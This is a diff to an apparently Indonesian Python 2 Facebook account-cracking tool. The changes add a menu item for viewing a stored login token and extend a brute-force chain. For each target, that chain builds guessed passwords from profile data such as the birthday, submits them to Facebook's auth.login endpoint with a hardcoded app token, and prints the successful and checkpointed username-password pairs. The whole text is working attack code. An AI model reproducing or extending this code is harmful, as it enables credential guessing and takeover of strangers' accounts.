@@ -153,7 +153,7 @@ def menu():
     print '\x1b[1;37;40m4. Selanjutnya..     '
     print '\x1b[1;37;40m5. LogOut Facebook   '
     print '\x1b[1;31;40m0. Keluar Program    '
-    print  
+    print '\x1b[1;35;40m6. Lihat Token FB    '
     pilih()
 
 
@@ -180,11 +180,16 @@ def pilih():
                        
                             keluar()
                         else:
-                            if zedd == '0':
-                                keluar()
-                            else:
-                                print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + zedd + ' \x1b[1;91mTidak ada'
-                                pilih()
+							if zedd == '6':
+								os.system('nano login.txt')
+                       
+								keluar()
+							else:
+								if zedd == '0':
+									keluar()
+								else:
+									print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + zedd + ' \x1b[1;91mTidak ada'
+									pilih()
 
 
 def informasi():
@@ -673,16 +678,25 @@ def pilih_super():
 																		if 'www.facebook.com' in q['error_msg']:
 																			print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass8
 																		else:
-																			lahir = b['birthday']
-																			pass9 = lahir.replace('/', '')
+																			pass9 = b['indonesia']
 																			data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
 																			q = json.load(data)
 																			if 'access_token' in q:
 																				print '\x1b[1;97m[\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass9
 																			else:
-										
 																				if 'www.facebook.com' in q['error_msg']:
 																					print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass9
+																				else:
+																					lahir = b['birthday']
+																					pass10 = lahir.replace('/', '')
+																					data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass10 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+																					q = json.load(data)
+																					if 'access_token' in q:
+																						print '\x1b[1;97m[\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass10
+																					else:
+										
+																						if 'www.facebook.com' in q['error_msg']:
+																							print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass10
 																											
         except:
             pass
